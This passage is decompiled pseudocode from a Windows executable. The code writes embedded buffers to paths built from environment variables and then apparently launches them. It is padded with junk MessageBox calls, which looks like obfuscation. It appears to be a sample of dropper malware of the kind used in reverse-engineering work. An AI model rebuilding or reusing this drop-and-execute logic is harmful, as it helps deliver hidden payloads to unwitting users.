            && lstrcmpiA((LPCSTR)&unk_406904 + 424 * i, a3a) )
          {
            sub_401DC3(a1, (int)&unk_406904 + 424 * i, (_WORD *)v10);
          }
          else
          {
            lpString1 = (char *)sub_403F75(0x105u);
            if ( lstrcmpiA((LPCSTR)&unk_406904 + 424 * i, byte_406354) )
            {
              if ( lstrcmpiA((LPCSTR)&unk_406904 + 424 * i, aA) )
              {
                if ( lstrcmpiA((LPCSTR)&unk_406904 + 424 * i, a8) )
                {
                  if ( !lstrcmpiA((LPCSTR)&unk_406904 + 424 * i, a3a) )
                  {
                    v5 = sub_403E9E(a3a);
                    sub_403F60(lpString1, v5);
                  }
                }
                else
                {
                  v4 = sub_403E9E(a8);
                  sub_403F60(lpString1, v4);
                }
              }
              else
              {
                v3 = sub_403E9E(a0);
                sub_403F60(lpString1, v3);
              }
            }
            else
            {
              v2 = sub_403E9E(a0);
              lstrcpyA(lpString1, v2);
              lstrcatA(lpString1, asc_406510);
              sub_403E7C(lpString1, a0_0);
            }
            lstrcatA(lpString1, asc_406514);
            sub_403E7C(lpString1, (const char *)&unk_40692D + 424 * i);
            MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
            MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
            result = __(lpString1, 0x40000000, 0, 0, 2, 0, 0);
            v6 = result;
            if ( result == -1 )
              return result;
            dword_407120(result, v10, dwBytes, &dwBytes, 0);
            dword_407124(v6);
            MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
            MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
            if ( byte_406A32[424 * i] == 49 && byte_406A32[424 * i] == 51 )
              dword_407118(0, &unk_406388, lpString1, 0, 0, 1);
            else
              dword_407118(0, &unk_406388, lpString1, 0, 0, 0);
          }
        }
        else
        {
          MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
          sub_401DC3(a1, (int)::lpString1, (_WORD *)v10);
        }
      }
      else
      {
        MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
        MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
        sub_401DC3(a1, (int)lpString2, (_WORD *)v10);
      }
    }
  }
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  ((void (__stdcall *)(int))v17)(v14);
  return MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
}
// 4070E4: using guessed type int dword_4070E4;
// 407118: using guessed type int (__stdcall *dword_407118)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40711C: using guessed type int (__stdcall *__)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407120: using guessed type int (__stdcall *dword_407120)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407124: using guessed type int (__stdcall *dword_407124)(_DWORD);

//----- (00403CA4) --------------------------------------------------------
int __cdecl sub_403CA4(int a1)
{
  char v2[4]; // [esp+0h] [ebp-18h] BYREF
  int v3; // [esp+4h] [ebp-14h]

  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  dword_407128(a1, 0, v2, 24, 0);
  return v3;
}
// 407128: using guessed type int (__stdcall *dword_407128)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 403CA4: using guessed type char var_18[4];

//----- (00403DB0) --------------------------------------------------------
_BYTE *__usercall sub_403DB0@<eax>(int a1@<ebx>, int a2, SIZE_T dwBytes, int a4)
{
  _BYTE *v5; // [esp+Ch] [ebp-4h]

  if ( !a2 )
    return sub_403F75(dwBytes);
  if ( a4 == dwBytes )
    return (_BYTE *)a2;
  v5 = sub_403F75(dwBytes);
  if ( !v5 )
    return 0;
  if ( dwBytes <= a4 )
  {
    sub_403FC1(v5, a2, dwBytes);
  }
  else
  {
    sub_403FC1(v5, a2, a4);
    sub_403F8E(a1, &v5[a4], 0, dwBytes - a4);
  }
  sub_403E62((LPVOID)a2);
  return v5;
}

//----- (00403E62) --------------------------------------------------------
BOOL __cdecl sub_403E62(LPVOID lpMem)
{
  BOOL result; // eax

  if ( lpMem )
    return HeapFree(hHeap, 0, lpMem);
  return result;
}

//----- (00403E7C) --------------------------------------------------------
char *__cdecl sub_403E7C(char *a1, const char *a2)
{
  char *i; // eax

  for ( i = a1; *i; ++i )
    ;
  sub_403F60(i, a2);
  return a1;
}

//----- (00403E9E) --------------------------------------------------------
CHAR *__cdecl sub_403E9E(LPCSTR lpName)
{
  DWORD EnvironmentVariableA; // eax

  EnvironmentVariableA = GetEnvironmentVariableA(lpName, Buffer, 0x400u);
  if ( EnvironmentVariableA && EnvironmentVariableA <= 0x400 )
    return Buffer;
  else
    return 0;
}

//----- (00403EC7) --------------------------------------------------------
int __cdecl sub_403EC7(char *a1, _BYTE *a2)
{
  char v4; // al

  while ( 1 )
  {
    v4 = *a1;
    if ( *a1 != *a2 )
      return v4 - (char)*a2;
    if ( !v4 )
      break;
    ++a1;
    ++a2;
  }
  return 0;
}

//----- (00403EE9) --------------------------------------------------------
_BYTE *__cdecl sub_403EE9(int a1, _BYTE *a2)
{
  int v2; // eax
  _BYTE *i; // edx
  _BYTE *v4; // esi
  char v5; // al
  _BYTE *v6; // ecx
  _BYTE *v7; // esi

  v2 = a1;
  if ( !a1 )
    v2 = dword_407530;
  for ( i = (_BYTE *)v2; *i; ++i )
  {
    v4 = a2;
    if ( *a2 )
    {
      v5 = *a2;
      do
      {
        if ( v5 == *i )
          break;
        v5 = *++v4;
      }
      while ( *v4 );
    }
    if ( !*v4 )
      break;
  }
  v6 = i;
  v7 = a2;
  if ( *i )
  {
    while ( *v6 != *v7 )
    {
      if ( !*++v7 )
      {
        v7 = a2;
        ++v6;
      }
      if ( !*v6 )
        goto LABEL_17;
    }
    *v6++ = 0;
  }
LABEL_17:
  dword_407530 = (int)v6;
  return v6 != i ? i : 0;
}
// 407530: using guessed type int dword_407530;

//----- (00403F60) --------------------------------------------------------
char *__cdecl sub_403F60(char *a1, const char *a2)
{
  strcpy(a1, a2);
  return a1;
}

//----- (00403F75) --------------------------------------------------------
LPVOID __cdecl sub_403F75(SIZE_T dwBytes)
{
  SIZE_T v1; // eax

  v1 = dwBytes;
  if ( !dwBytes )
    v1 = 1;
  return HeapAlloc(hHeap, 0, v1);
}

//----- (00403F8E) --------------------------------------------------------
char *__usercall sub_403F8E@<eax>(int a1@<ebx>, char *a2, char a3, unsigned int a4)
{
  int v4; // eax

  if ( a4 )
  {
    LOBYTE(a1) = a3;
    BYTE1(a1) = a3;
    v4 = a1 << 16;
    LOWORD(v4) = a1;
    memset32(a2, v4, a4 >> 2);
    memset(&a2[4 * (a4 >> 2)], a3, a4 & 3);
  }
  return a2;
}
// 403F8E: could not find valid save-restore pair for ebx

//----- (00403FC1) --------------------------------------------------------
_BYTE *__cdecl sub_403FC1(_BYTE *a1, int a2, int a3)
{
  int v3; // esi
  _BYTE *v4; // ecx

  v3 = a3;
  if ( a3 )
  {
    v4 = a1;
    do
    {
      *v4 = v4[a2 - (_DWORD)a1];
      ++v4;
      --v3;
    }
    while ( v3 );
  }
  return a1;
}

//----- (00403FE3) --------------------------------------------------------
unsigned int __cdecl sub_403FE3(char *a1)
{
  return sub_404112(a1, 0, 0xAu);
}

//----- (00403FF4) --------------------------------------------------------
int __cdecl sub_403FF4(int a1)
{
  int result; // eax

  result = -1;
  do
    ++result;
  while ( *(_BYTE *)(result + a1) );
  return result;
}

//----- (00404003) --------------------------------------------------------
int sub_404003()
{
  dword_406518 = 1103515245 * dword_406518 + 12345;
  return HIWORD(dword_406518) & 0x7FFF;
}
// 406518: using guessed type int dword_406518;

//----- (00404026) --------------------------------------------------------
void __usercall __noreturn start(int a1@<ebx>)
{
  LPSTR CommandLineA; // esi
  unsigned __int8 v2; // cl
  CHAR v3; // al
  int wShowWindow; // eax
  HMODULE ModuleHandleA; // eax
  int v6; // eax
  int v7; // [esp-8h] [ebp-4Ch]
  struct _STARTUPINFOA StartupInfo; // [esp+0h] [ebp-44h] BYREF

  if ( dword_4075C4 && !dword_4075C4() )
    ExitProcess(0xFFFFFFFE);
  if ( sub_40421A(off_40600C, (unsigned int)&unk_406014, 1) )
    ExitProcess(0xFFFFFFFD);
  sub_40421A(off_406000, (unsigned int)&unk_406008, 0);
  CommandLineA = GetCommandLineA();
  if ( !CommandLineA )
    CommandLineA = (LPSTR)&unk_4050EC;
  v2 = 32;
  while ( 1 )
  {
    if ( !*CommandLineA )
      goto LABEL_20;
    if ( (unsigned __int8)*CommandLineA > 0x20u )
      break;
    ++CommandLineA;
  }
  v3 = *CommandLineA;
  do
  {
    if ( v3 == 34 )
      v2 ^= 0x20u;
    v3 = *++CommandLineA;
  }
  while ( (unsigned __int8)*CommandLineA > v2 );
LABEL_20:
  while ( *CommandLineA && (unsigned __int8)*CommandLineA <= v2 )
    ++CommandLineA;
  StartupInfo.dwFlags = 0;
  GetStartupInfoA(&StartupInfo);
  if ( (StartupInfo.dwFlags & 1) != 0 )
    wShowWindow = StartupInfo.wShowWindow;
  else
    wShowWindow = 10;
  v7 = wShowWindow;
  ModuleHandleA = GetModuleHandleA(0);
  v6 = sub_40102C(a1, (int)ModuleHandleA, 0, (int)CommandLineA, v7);
  sub_4041E5(v6);
}
// 406000: using guessed type int (*off_406000[2])(void);
// 40600C: using guessed type int (*off_40600C[2])(void);
// 4075C4: using guessed type int (*dword_4075C4)(void);

//----- (004040FD) --------------------------------------------------------
BOOL sub_4040FD()
{
  hHeap = GetProcessHeap();
  return hHeap == 0;
}

//----- (00404112) --------------------------------------------------------
unsigned int __cdecl sub_404112(char *a1, char **a2, unsigned int a3)
{
  unsigned int v4; // esi
  BOOL v5; // edi
  char v6; // cl
  unsigned int v8; // edx
  char v9; // dl
  char v10; // cl
  unsigned int v11; // ecx
  unsigned int v12; // ecx

  v4 = 0;
  v5 = 0;
  while ( *a1 && (unsigned __int8)*a1 <= 0x20u )
    ++a1;
  v6 = *a1;
  if ( !*a1 )
  {
    if ( a2 )
      *a2 = a1;
    return 0;
  }
  if ( v6 == 43 || v6 == 45 )
  {
    ++a1;
    v5 = v6 == 45;
  }
  v8 = a3;
  if ( !a3 )
  {
    if ( *a1 != 48 )
    {
      v8 = 10;
      goto LABEL_33;
    }
    v9 = a1[1];
    if ( v9 != 120 && v9 != 88 )
    {
      v8 = 8;
      ++a1;
      goto LABEL_33;
    }
    v8 = 16;
    goto LABEL_23;
  }
  if ( a3 == 16 && *a1 == 48 )
  {
    v10 = a1[1];
    if ( v10 == 120 || v10 == 88 )
LABEL_23:
      a1 += 2;
  }
LABEL_33:
  while ( 1 )
  {
    LOBYTE(v11) = *a1;
    if ( !*a1 )
      break;
    v11 = (unsigned __int8)v11;
    if ( (unsigned __int8)v11 >= 0x61u )
      v11 = (unsigned __int8)v11 - 32;
    if ( v11 < 0x41 )
    {
      if ( v11 < 0x30 || v11 > 0x39 )
        break;
      v12 = v11 - 48;
    }
    else
    {
      v12 = v11 - 55;
    }
    if ( v12 >= v8 )
      break;
    v4 = v12 + v8 * v4;
    ++a1;
  }
  if ( a2 )
    *a2 = a1;
  if ( v5 )
    return -v4;
  return v4;
}

//----- (004041E5) --------------------------------------------------------
void __cdecl __noreturn sub_4041E5(UINT uExitCode)
{
  sub_404241();
  sub_40421A(&dword_406018, (unsigned int)&unk_40601C, 0);
  sub_40421A(&dword_406020, (unsigned int)&unk_406024, 0);
  ExitProcess(uExitCode);
}
// 406018: using guessed type int (*dword_406018)(void);
// 406020: using guessed type int (*dword_406020)(void);

//----- (0040421A) --------------------------------------------------------
int __cdecl sub_40421A(int (**a1)(void), unsigned int a2, int a3)
{
  int result; // eax

  while ( (unsigned int)a1 < a2 )
  {
    if ( *a1 )
    {
      result = (*a1)();
      if ( a3 )
      {
        if ( result )
          return result;
      }
    }
    ++a1;
  }
  return 0;
}

//----- (00404241) --------------------------------------------------------
int sub_404241()
{
  int result; // eax

  while ( dword_407534 )
    result = ((int (*)(void))dword_407540[--dword_407534])();
  return result;
}
// 407534: using guessed type int dword_407534;
// 407540: using guessed type int dword_407540[32];

// nfuncs=44 queued=43 decompiled=43 lumina nreq=0 worse=0 better=0
// ALL OK, 43 function(s) have been successfully decompiled
